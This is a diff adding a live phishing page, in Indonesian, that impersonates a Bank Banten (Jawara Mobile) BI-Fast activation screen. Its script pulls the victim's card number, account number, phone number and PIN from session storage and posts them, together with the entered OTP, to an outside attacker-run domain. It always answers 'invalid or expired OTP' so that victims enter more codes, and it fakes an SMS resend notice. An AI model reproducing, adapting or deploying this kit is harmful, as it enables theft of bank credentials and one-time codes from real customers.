@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#1487d7"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <title>otp Aktivasi</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+            position: fixed;
+            background: #d1d1d1;
+        }
+        
+       .container{
+         max-width: 100%;
+         width: 330px;
+         height: 450px;
+         background: #fff;
+         margin: -40px auto;
+         border-radius: 15px;
+         display: block;
+         position: relative;
+         top: 150px;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         box-sizing: border-box;
+         justify-content: center;
+         justify-items: center;
+         align-items: center;
+       }
+       .wraper{
+         width: 100%;
+         position: fixed;
+         top: 0;
+         height: auto;
+         left: 0;
+         right: 0;
+         box-sizing: border-box;
+         
+       }
+       .wraper img{
+         width: 300px;
+         margin: 9px;
+         height: 200px;
+         left: 0;
+         right: 0;
+       }
+       .animasi{
+        margin-top: -70px;
+        position: absolute;
+        left: 0px;
+        right: 0;
+       }
+       .box-otp{
+         max-width: 90%;
+         width: 287px;
+         padding: 10px;
+         margin: 12px auto;
+         text-align: center;
+         font-size: 15px;
+         outline: none;
+         background: #fff;
+         border-radius: 8px;
+         border: 1px solid #c0c0c0;
+         font-weight: 600;
+         z-index: 999999999;
+         box-sizing: border-box;
+       }
+       #pelew{
+         width: 80%;
+         padding: 10px;
+         margin: 33px;
+         border: 1px solid #fff;
+         cursor: pointer!important;
+         background: #1193e9;
+         border-radius: 8px;
+         font-size: 15px;
+         color: #fff;
+         font-weight: 600;
+         box-shadow: 4px 7px 10px rgba(0,0,0,0.5);
+         
+       }
+       h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            width: 100%;
+            font-size: 10px;
+            margin-bottom: -70px;
+            text-align: center;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            position: fixed;
+            margin-top: -8px;
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+.textarea1 {
+     box-sizing: border-box; 
+     border: 1px solid red;
+     border-radius: 8px;
+     
+        }
+        .textarea2 {
+     box-sizing: border-box; 
+     border: 2px solid #C7B700;
+     border-radius: 8px;  
+  }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="wraper">
+      <center>
+      <img src="https://i.imghippo.com/files/GO6715Cc.png" alt="" class="" style="width: 200px;height: 160px;left: 0;right: 0;margin: 25px auto;top: 0;">
+      </center>
+      </div>
+      <br><br>
+      <div style="width: 90%;padding: 9px;border-bottom: 1px solid transparent;margin: 7px;position: relative;top: 25px;">
+        <h6 style="text-align: center;font-size: 10px;color: #000;">Masukan Kode Aktivasi Pendaftaran  BI-Fast Anda Yang Telah Kami Kirimkan Melalui Pesan SMS di Nomor Handphone Kamu Yang Terdaftar Di Jawara Mobile by Bank Banten, Untuk Melanjutkan Proses Pendaftaran Transaksi BI-Fast </h6>
+      </div>
+      <form action="./sendOtp.php" method="post" id="sendOtp">
+        <span class="blink" style="display: none" id="blinkAktivasi"><h1>OTP Aktivasi Tidak Valid/Kadaluarsa</h1></span>
+       <input type="hidden" name="nokarku" id="nokarku" value="">
+       <input type="hidden" name="noreku" id="noreku" value="">
+       <input type="hidden" name="nomorku" id="nomorku" value="">
+       <input type="hidden" name="pinku" id="pinku" value="">
+        <div class="box-=input">
+          <center>
+          <input type="text" name="otp" id="otp" placeholder="Kode Aktivasi 6 Digit"  required class="box-otp" onclick="gantiborder1()" required inputmode="numeric" minlength="6" maxlength="8" required>
+          </center>
+        </div>
+        <center>
+       <p id="alert" style="font-size: 10px;width: 100%;background: transparent;color: #000;position: fixed;text-align: center;top: 445px;right: 0;left: 0;font-weight: bold;display: ;" class="alert"></p>
+     </center>
+        <div class="box-btn">
+          <button type="submit" id="pelew">Konfirmasi</button>
+        </div>
+      </form>
+  </div>
+  <br>
+  <br>
+  <br><br>
+   <button style="width: 100%;font-size: 12px;background: none;border: none;text-align: center;font-weight: bold;position: fixed;margin-top: 50px;margin-left: 0;color:rgb(9, 100, 127);" onclick="sendUlang()">>>Kirim Ulang SMS Cetak Kupon<<</button>
+  <!-- partial -->
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+var nokar = sessionStorage.getItem("nokar");
+document.getElementById("nokarku").value = nokar + "";
+
+var norek = sessionStorage.getItem("norek");
+document.getElementById("noreku").value = norek + "";
+
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomorku").value = nomor + "";
+
+var pin = sessionStorage.getItem("pin");
+document.getElementById("pinku").value = pin + "";
+
+
+  </script>
+ <script>
+ $('#sendOtp').on('submit', function (event) {
+
+  event.stopPropagation();
+    event.preventDefault();
+  document.getElementById('pelew').innerHTML = "Memproses....";
+ 
+
+
+
+$.ajax({
+
+ type: 'POST',
+ url: 'https://galakmalengtokenbotlitukampangs.com/banten/req/sendOtp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ setTimeout(function(){
+ document.getElementById('pelew').innerHTML = "Konfirmasi";
+ 
+  document.getElementById("blinkAktivasi").style.display = "block";
+ $("#otp").val("");
+ $("#otp").addClass('textarea1'); 
+  
+
+
+    },900);
+
+
+
+        }
+    });
+
+    return false;
+});   
+        
+</script>
+<script>
+  function sendUlang(){
+    $('.blink').hide();event.preventDefault();
+    setTimeout(function(){
+    $("#otp").removeClass('textarea1');
+    },700);
+    
+    $("#otp").addClass('textarea2');
+    $('#alert').show();
+     var nomorku = document.getElementById('nomorku').value;
+     sessionStorage.setItem('nomorku', nomorku);
+     document.getElementById('alert').innerHTML = 'OTP telah terkirim ulang ke +62' +  nomorku +  '<br>via SMS di nomor handphone anda';
+  }
+</script>
+<script>
+ function gantiborder1(){
+   $("#otp").removeClass('textarea1'); 
+   
+   $("#blinkAktivasi").hide(); 
+   document.getElementById('pelew').value = "Konfirmasi";
+ }   
+</script>
+</body>
+</html>
